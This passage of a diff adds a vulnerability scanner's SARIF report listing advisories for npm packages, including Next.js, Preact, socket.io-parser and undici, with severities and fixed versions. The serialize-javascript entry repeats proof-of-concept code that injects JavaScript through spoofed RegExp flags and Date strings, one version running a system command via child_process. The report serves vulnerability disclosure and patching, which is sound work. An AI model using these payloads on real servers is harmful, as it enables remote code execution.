+              "id": "CVE-2026-27980",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "next.js: Next.js: Unbounded next/image disk cache growth can exhaust storage"
+              },
+              "fullDescription": {
+                "text": "Next.js is a React framework for building full-stack web applications. Starting in version 10.0.0 and prior to version 16.1.7, the default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth. An attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service. This is fixed in version 16.1.7 by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. If upgrading is not immediately possible, periodically clean `.next/cache/images` and/or reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`)."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-27980",
+              "help": {
+                "text": "Vulnerability CVE-2026-27980\nSeverity: MEDIUM\nPackage: next\nFixed Version: 16.1.7\nLink: [CVE-2026-27980](https://avd.aquasec.com/nvd/cve-2026-27980)\nNext.js is a React framework for building full-stack web applications. Starting in version 10.0.0 and prior to version 16.1.7, the default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth. An attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service. This is fixed in version 16.1.7 by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. If upgrading is not immediately possible, periodically clean `.next/cache/images` and/or reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`).",
+                "markdown": "**Vulnerability CVE-2026-27980**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|next|16.1.7|[CVE-2026-27980](https://avd.aquasec.com/nvd/cve-2026-27980)|\n\nNext.js is a React framework for building full-stack web applications. Starting in version 10.0.0 and prior to version 16.1.7, the default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth. An attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service. This is fixed in version 16.1.7 by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. If upgrading is not immediately possible, periodically clean `.next/cache/images` and/or reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`)."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "0.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-29057",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "next.js: Next.js: HTTP request smuggling in rewrites"
+              },
+              "fullDescription": {
+                "text": "Next.js is a React framework for building full-stack web applications. Starting in version 9.5.0 and prior to versions 15.5.13 and 16.1.7, when Next.js rewrites proxy traffic to an external backend, a crafted `DELETE`/`OPTIONS` request using `Transfer-Encoding: chunked` could trigger request boundary disagreement between the proxy and backend. This could allow request smuggling through rewritten routes. An attacker could smuggle a second request to unintended backend routes (for example, internal/admin endpoints), bypassing assumptions that only the configured rewrite destination/path is reachable. This does not impact applications hosted on providers that handle rewrites at the CDN level, such as Vercel.  The vulnerability originated in an upstream library vendored by Next.js. It is fixed in Next.js 15.5.13 and 16.1.7 by updating that dependency’s behavior so `content-length: 0` is added only when both `content-length` and `transfer-encoding` are absent, and `transfer-encoding` is no longer removed in that code path. If upgrading is not immediately possible, block chunked `DELETE`/`OPTIONS` requests on rewritten routes at the edge/proxy, and/or enforce authentication/authorization on backend routes."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-29057",
+              "help": {
+                "text": "Vulnerability CVE-2026-29057\nSeverity: MEDIUM\nPackage: next\nFixed Version: 16.1.7, 15.5.13\nLink: [CVE-2026-29057](https://avd.aquasec.com/nvd/cve-2026-29057)\nNext.js is a React framework for building full-stack web applications. Starting in version 9.5.0 and prior to versions 15.5.13 and 16.1.7, when Next.js rewrites proxy traffic to an external backend, a crafted `DELETE`/`OPTIONS` request using `Transfer-Encoding: chunked` could trigger request boundary disagreement between the proxy and backend. This could allow request smuggling through rewritten routes. An attacker could smuggle a second request to unintended backend routes (for example, internal/admin endpoints), bypassing assumptions that only the configured rewrite destination/path is reachable. This does not impact applications hosted on providers that handle rewrites at the CDN level, such as Vercel.  The vulnerability originated in an upstream library vendored by Next.js. It is fixed in Next.js 15.5.13 and 16.1.7 by updating that dependency’s behavior so `content-length: 0` is added only when both `content-length` and `transfer-encoding` are absent, and `transfer-encoding` is no longer removed in that code path. If upgrading is not immediately possible, block chunked `DELETE`/`OPTIONS` requests on rewritten routes at the edge/proxy, and/or enforce authentication/authorization on backend routes.",
+                "markdown": "**Vulnerability CVE-2026-29057**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|next|16.1.7, 15.5.13|[CVE-2026-29057](https://avd.aquasec.com/nvd/cve-2026-29057)|\n\nNext.js is a React framework for building full-stack web applications. Starting in version 9.5.0 and prior to versions 15.5.13 and 16.1.7, when Next.js rewrites proxy traffic to an external backend, a crafted `DELETE`/`OPTIONS` request using `Transfer-Encoding: chunked` could trigger request boundary disagreement between the proxy and backend. This could allow request smuggling through rewritten routes. An attacker could smuggle a second request to unintended backend routes (for example, internal/admin endpoints), bypassing assumptions that only the configured rewrite destination/path is reachable. This does not impact applications hosted on providers that handle rewrites at the CDN level, such as Vercel.  The vulnerability originated in an upstream library vendored by Next.js. It is fixed in Next.js 15.5.13 and 16.1.7 by updating that dependency’s behavior so `content-length: 0` is added only when both `content-length` and `transfer-encoding` are absent, and `transfer-encoding` is no longer removed in that code path. If upgrading is not immediately possible, block chunked `DELETE`/`OPTIONS` requests on rewritten routes at the edge/proxy, and/or enforce authentication/authorization on backend routes."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "0.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-22028",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "preact: Preact: Arbitrary script execution via JSON serialization protection bypass"
+              },
+              "fullDescription": {
+                "text": "Preact, a lightweight web development framework, JSON serialization protection to prevent Virtual DOM elements from being constructed from arbitrary JSON. A regression introduced in Preact 10.26.5 caused this protection to be softened. In applications where values from JSON payloads are assumed to be strings and passed unmodified to Preact as children, a specially-crafted JSON payload could be constructed that would be incorrectly treated as a valid VNode. When this chain of failures occurs it can result in HTML injection, which can allow arbitrary script execution if not mitigated by CSP or other means. Applications using affected Preact versions are vulnerable if they meet all of the following conditions: first, pass unmodified, unsanitized values from user-modifiable data sources (APIs, databases, local storage, etc.) directly into the render tree; second assume these values are strings but the data source could return actual JavaScript objects instead of JSON strings; and third, the data source either fails to perform type sanitization AND blindly stores/returns raw objects interchangeably with strings, OR is compromised (e.g., poisoned local storage, filesystem, or database). Versions 10.26.10, 10.27.3, and 10.28.2 patch the issue. The patch versions restore the previous strict equality checks that prevent JSON-parsed objects from being treated as valid VNodes. Other mitigations are available for those who cannot immediately upgrade. Validate input types, cast or validate network data, sanitize external data, and use Content Security Policy (CSP)."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-22028",
+              "help": {
+                "text": "Vulnerability CVE-2026-22028\nSeverity: HIGH\nPackage: preact\nFixed Version: 10.26.10, 10.27.3, 10.28.2\nLink: [CVE-2026-22028](https://avd.aquasec.com/nvd/cve-2026-22028)\nPreact, a lightweight web development framework, JSON serialization protection to prevent Virtual DOM elements from being constructed from arbitrary JSON. A regression introduced in Preact 10.26.5 caused this protection to be softened. In applications where values from JSON payloads are assumed to be strings and passed unmodified to Preact as children, a specially-crafted JSON payload could be constructed that would be incorrectly treated as a valid VNode. When this chain of failures occurs it can result in HTML injection, which can allow arbitrary script execution if not mitigated by CSP or other means. Applications using affected Preact versions are vulnerable if they meet all of the following conditions: first, pass unmodified, unsanitized values from user-modifiable data sources (APIs, databases, local storage, etc.) directly into the render tree; second assume these values are strings but the data source could return actual JavaScript objects instead of JSON strings; and third, the data source either fails to perform type sanitization AND blindly stores/returns raw objects interchangeably with strings, OR is compromised (e.g., poisoned local storage, filesystem, or database). Versions 10.26.10, 10.27.3, and 10.28.2 patch the issue. The patch versions restore the previous strict equality checks that prevent JSON-parsed objects from being treated as valid VNodes. Other mitigations are available for those who cannot immediately upgrade. Validate input types, cast or validate network data, sanitize external data, and use Content Security Policy (CSP).",
+                "markdown": "**Vulnerability CVE-2026-22028**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|preact|10.26.10, 10.27.3, 10.28.2|[CVE-2026-22028](https://avd.aquasec.com/nvd/cve-2026-22028)|\n\nPreact, a lightweight web development framework, JSON serialization protection to prevent Virtual DOM elements from being constructed from arbitrary JSON. A regression introduced in Preact 10.26.5 caused this protection to be softened. In applications where values from JSON payloads are assumed to be strings and passed unmodified to Preact as children, a specially-crafted JSON payload could be constructed that would be incorrectly treated as a valid VNode. When this chain of failures occurs it can result in HTML injection, which can allow arbitrary script execution if not mitigated by CSP or other means. Applications using affected Preact versions are vulnerable if they meet all of the following conditions: first, pass unmodified, unsanitized values from user-modifiable data sources (APIs, databases, local storage, etc.) directly into the render tree; second assume these values are strings but the data source could return actual JavaScript objects instead of JSON strings; and third, the data source either fails to perform type sanitization AND blindly stores/returns raw objects interchangeably with strings, OR is compromised (e.g., poisoned local storage, filesystem, or database). Versions 10.26.10, 10.27.3, and 10.28.2 patch the issue. The patch versions restore the previous strict equality checks that prevent JSON-parsed objects from being treated as valid VNodes. Other mitigations are available for those who cannot immediately upgrade. Validate input types, cast or validate network data, sanitize external data, and use Content Security Policy (CSP)."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "0.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-5c6j-r48x-rmvq",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()"
+              },
+              "fullDescription": {
+                "text": "### Impact\n\nThe serialize-javascript npm package (versions \u0026lt;= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `\u0026lt;script\u0026gt;` tags), the injected code executes.\n\n```javascript\nconst serialize = require(\u0026#39;serialize-javascript\u0026#39;);\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, \u0026#39;source\u0026#39;, { get: () =\u0026gt; \u0026#39;x\u0026#39; });\nObject.defineProperty(fakeRegex, \u0026#39;flags\u0026#39;, {\n  get: () =\u0026gt; \u0026#39;\u0026#34;+(global.PWNED=\u0026#34;CODE_INJECTION_VIA_FLAGS\u0026#34;)+\u0026#34;\u0026#39;\n});\nfakeRegex.toJSON = function() { return \u0026#39;@placeholder\u0026#39;; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\u0026#34;re\u0026#34;:new RegExp(\u0026#34;x\u0026#34;, \u0026#34;\u0026#34;+(global.PWNED=\u0026#34;CODE_INJECTION_VIA_FLAGS\u0026#34;)+\u0026#34;\u0026#34;)}\nlet obj;\neval(\u0026#39;obj = \u0026#39; + output);\nconsole.log(global.PWNED); // \u0026#34;CODE_INJECTION_VIA_FLAGS\u0026#34; — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require(\u0026#39;serialize-javascript\u0026#39;);\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return \u0026#39;\u0026#34;+(global.DATE_PWNED=\u0026#34;DATE_INJECTION\u0026#34;)+\u0026#34;\u0026#39;; };\nfakeDate.toJSON = function() { return \u0026#39;2024-01-01\u0026#39;; };\nconst output = serialize({ d: fakeDate });\n// Output: {\u0026#34;d\u0026#34;:new Date(\u0026#34;\u0026#34;+(global.DATE_PWNED=\u0026#34;DATE_INJECTION\u0026#34;)+\u0026#34;\u0026#34;)}\neval(\u0026#39;obj = \u0026#39; + output);\nconsole.log(global.DATE_PWNED); // \u0026#34;DATE_INJECTION\u0026#34; — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require(\u0026#39;serialize-javascript\u0026#39;);\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, \u0026#39;source\u0026#39;, { get: () =\u0026gt; \u0026#39;x\u0026#39; });\nObject.defineProperty(rceRegex, \u0026#39;flags\u0026#39;, {\n  get: () =\u0026gt; \u0026#39;\u0026#34;+require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;id\u0026#34;).toString()+\u0026#34;\u0026#39;\n});\nrceRegex.toJSON = function() { return \u0026#39;@rce\u0026#39;; };\nconst output = serialize({ re: rceRegex });\n// Output: {\u0026#34;re\u0026#34;:new RegExp(\u0026#34;x\u0026#34;, \u0026#34;\u0026#34;+require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;id\u0026#34;).toString()+\u0026#34;\u0026#34;)}\n// When eval\u0026#39;d on a Node.js server, executes the \u0026#34;id\u0026#34; system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-5c6j-r48x-rmvq",
+              "help": {
+                "text": "Vulnerability GHSA-5c6j-r48x-rmvq\nSeverity: HIGH\nPackage: serialize-javascript\nFixed Version: 7.0.3\nLink: [GHSA-5c6j-r48x-rmvq](https://github.com/advisories/GHSA-5c6j-r48x-rmvq)\n### Impact\n\nThe serialize-javascript npm package (versions \u003c= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `\u003cscript\u003e` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () =\u003e 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () =\u003e '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () =\u003e 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () =\u003e '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3",
+                "markdown": "**Vulnerability GHSA-5c6j-r48x-rmvq**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|serialize-javascript|7.0.3|[GHSA-5c6j-r48x-rmvq](https://github.com/advisories/GHSA-5c6j-r48x-rmvq)|\n\n### Impact\n\nThe serialize-javascript npm package (versions \u003c= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `\u003cscript\u003e` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () =\u003e 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () =\u003e '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () =\u003e 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () =\u003e '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3"
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "8.1",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-33151",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "socket.io allows an unbounded number of binary attachments"
+              },
+              "fullDescription": {
+                "text": "### Impact\n\nA specially crafted Socket.IO packet can make the server wait for a large number of binary attachments and buffer them, which can be exploited to make the server run out of memory.\n\n### Patches\n\n| Version range    | Used by                                    | Fixed version |\n|------------------|--------------------------------------------|---------------|\n| `\u0026gt;=4.0.0 \u0026lt;4.2.6` | `socket.io@4.x` and `socket.io-client@4.x` | `4.2.6`       |\n| `\u0026gt;=3.4.0 \u0026lt;3.4.4` | `socket.io@2.x`                            | `3.4.4`       |\n| `\u0026lt;3.3.5`         | `socket.io-client@2.x`                     | `3.3.5`       |\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https://github.com/socketio/socket.io/discussions)"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-33151",
+              "help": {
+                "text": "Vulnerability CVE-2026-33151\nSeverity: HIGH\nPackage: socket.io-parser\nFixed Version: 3.3.5, 3.4.4, 4.2.6\nLink: [CVE-2026-33151](https://avd.aquasec.com/nvd/cve-2026-33151)\n### Impact\n\nA specially crafted Socket.IO packet can make the server wait for a large number of binary attachments and buffer them, which can be exploited to make the server run out of memory.\n\n### Patches\n\n| Version range    | Used by                                    | Fixed version |\n|------------------|--------------------------------------------|---------------|\n| `\u003e=4.0.0 \u003c4.2.6` | `socket.io@4.x` and `socket.io-client@4.x` | `4.2.6`       |\n| `\u003e=3.4.0 \u003c3.4.4` | `socket.io@2.x`                            | `3.4.4`       |\n| `\u003c3.3.5`         | `socket.io-client@2.x`                     | `3.3.5`       |\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https://github.com/socketio/socket.io/discussions)",
+                "markdown": "**Vulnerability CVE-2026-33151**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|socket.io-parser|3.3.5, 3.4.4, 4.2.6|[CVE-2026-33151](https://avd.aquasec.com/nvd/cve-2026-33151)|\n\n### Impact\n\nA specially crafted Socket.IO packet can make the server wait for a large number of binary attachments and buffer them, which can be exploited to make the server run out of memory.\n\n### Patches\n\n| Version range    | Used by                                    | Fixed version |\n|------------------|--------------------------------------------|---------------|\n| `\u003e=4.0.0 \u003c4.2.6` | `socket.io@4.x` and `socket.io-client@4.x` | `4.2.6`       |\n| `\u003e=3.4.0 \u003c3.4.4` | `socket.io@2.x`                            | `3.4.4`       |\n| `\u003c3.3.5`         | `socket.io-client@2.x`                     | `3.3.5`       |\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https://github.com/socketio/socket.io/discussions)"
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "0.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-54798",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "tmp: tmp Symbolic Link Write Vulnerability"
+              },
+              "fullDescription": {
+                "text": "tmp is a temporary file and directory creator for node.js. In versions 0.2.3 and below, tmp is vulnerable to an arbitrary temporary file / directory write via symbolic link dir parameter. This is fixed in version 0.2.4."
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2025-54798",
+              "help": {
+                "text": "Vulnerability CVE-2025-54798\nSeverity: LOW\nPackage: tmp\nFixed Version: 0.2.4\nLink: [CVE-2025-54798](https://avd.aquasec.com/nvd/cve-2025-54798)\ntmp is a temporary file and directory creator for node.js. In versions 0.2.3 and below, tmp is vulnerable to an arbitrary temporary file / directory write via symbolic link dir parameter. This is fixed in version 0.2.4.",
+                "markdown": "**Vulnerability CVE-2025-54798**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|LOW|tmp|0.2.4|[CVE-2025-54798](https://avd.aquasec.com/nvd/cve-2025-54798)|\n\ntmp is a temporary file and directory creator for node.js. In versions 0.2.3 and below, tmp is vulnerable to an arbitrary temporary file / directory write via symbolic link dir parameter. This is fixed in version 0.2.4."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "2.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-1526",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "undici: undici: Denial of Service via unbounded memory consumption during WebSocket permessage-deflate decompression"
+              },
+              "fullDescription": {
+                "text": "The undici WebSocket client is vulnerable to a denial-of-service attack via unbounded memory consumption during permessage-deflate decompression. When a WebSocket connection negotiates the permessage-deflate extension, the client decompresses incoming compressed frames without enforcing any limit on the decompressed data size. A malicious WebSocket server can send a small compressed frame (a \u0026#34;decompression bomb\u0026#34;) that expands to an extremely large size in memory, causing the Node.js process to exhaust available memory and crash or become unresponsive.\n\nThe vulnerability exists in the PerMessageDeflate.decompress() method, which accumulates all decompressed chunks in memory and concatenates them into a single Buffer without checking whether the total size exceeds a safe threshold."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-1526",
+              "help": {
+                "text": "Vulnerability CVE-2026-1526\nSeverity: HIGH\nPackage: undici\nFixed Version: 6.24.0, 7.24.0\nLink: [CVE-2026-1526](https://avd.aquasec.com/nvd/cve-2026-1526)\nThe undici WebSocket client is vulnerable to a denial-of-service attack via unbounded memory consumption during permessage-deflate decompression. When a WebSocket connection negotiates the permessage-deflate extension, the client decompresses incoming compressed frames without enforcing any limit on the decompressed data size. A malicious WebSocket server can send a small compressed frame (a \"decompression bomb\") that expands to an extremely large size in memory, causing the Node.js process to exhaust available memory and crash or become unresponsive.\n\nThe vulnerability exists in the PerMessageDeflate.decompress() method, which accumulates all decompressed chunks in memory and concatenates them into a single Buffer without checking whether the total size exceeds a safe threshold.",
+                "markdown": "**Vulnerability CVE-2026-1526**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|undici|6.24.0, 7.24.0|[CVE-2026-1526](https://avd.aquasec.com/nvd/cve-2026-1526)|\n\nThe undici WebSocket client is vulnerable to a denial-of-service attack via unbounded memory consumption during permessage-deflate decompression. When a WebSocket connection negotiates the permessage-deflate extension, the client decompresses incoming compressed frames without enforcing any limit on the decompressed data size. A malicious WebSocket server can send a small compressed frame (a \"decompression bomb\") that expands to an extremely large size in memory, causing the Node.js process to exhaust available memory and crash or become unresponsive.\n\nThe vulnerability exists in the PerMessageDeflate.decompress() method, which accumulates all decompressed chunks in memory and concatenates them into a single Buffer without checking whether the total size exceeds a safe threshold."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-2229",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "undici: Undici: Denial of Service via invalid WebSocket permessage-deflate extension parameter"
+              },
+              "fullDescription": {
+                "text": "ImpactThe undici WebSocket client is vulnerable to a denial-of-service attack due to improper validation of the server_max_window_bits parameter in the permessage-deflate extension. When a WebSocket client connects to a server, it automatically advertises support for permessage-deflate compression. A malicious server can respond with an out-of-range server_max_window_bits value (outside zlib\u0026#39;s valid range of 8-15). When the server subsequently sends a compressed frame, the client attempts to create a zlib InflateRaw instance with the invalid windowBits value, causing a synchronous RangeError exception that is not caught, resulting in immediate process termination.\n\nThe vulnerability exists because:\n\n  *  The isValidClientWindowBits() function only validates that the value contains ASCII digits, not that it falls within the valid range 8-15\n  *  The createInflateRaw() call is not wrapped in a try-catch block\n  *  The resulting exception propagates up through the call stack and crashes the Node.js process"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-2229",
+              "help": {
+                "text": "Vulnerability CVE-2026-2229\nSeverity: HIGH\nPackage: undici\nFixed Version: 6.24.0, 7.24.0\nLink: [CVE-2026-2229](https://avd.aquasec.com/nvd/cve-2026-2229)\nImpactThe undici WebSocket client is vulnerable to a denial-of-service attack due to improper validation of the server_max_window_bits parameter in the permessage-deflate extension. When a WebSocket client connects to a server, it automatically advertises support for permessage-deflate compression. A malicious server can respond with an out-of-range server_max_window_bits value (outside zlib's valid range of 8-15). When the server subsequently sends a compressed frame, the client attempts to create a zlib InflateRaw instance with the invalid windowBits value, causing a synchronous RangeError exception that is not caught, resulting in immediate process termination.\n\nThe vulnerability exists because:\n\n  *  The isValidClientWindowBits() function only validates that the value contains ASCII digits, not that it falls within the valid range 8-15\n  *  The createInflateRaw() call is not wrapped in a try-catch block\n  *  The resulting exception propagates up through the call stack and crashes the Node.js process",
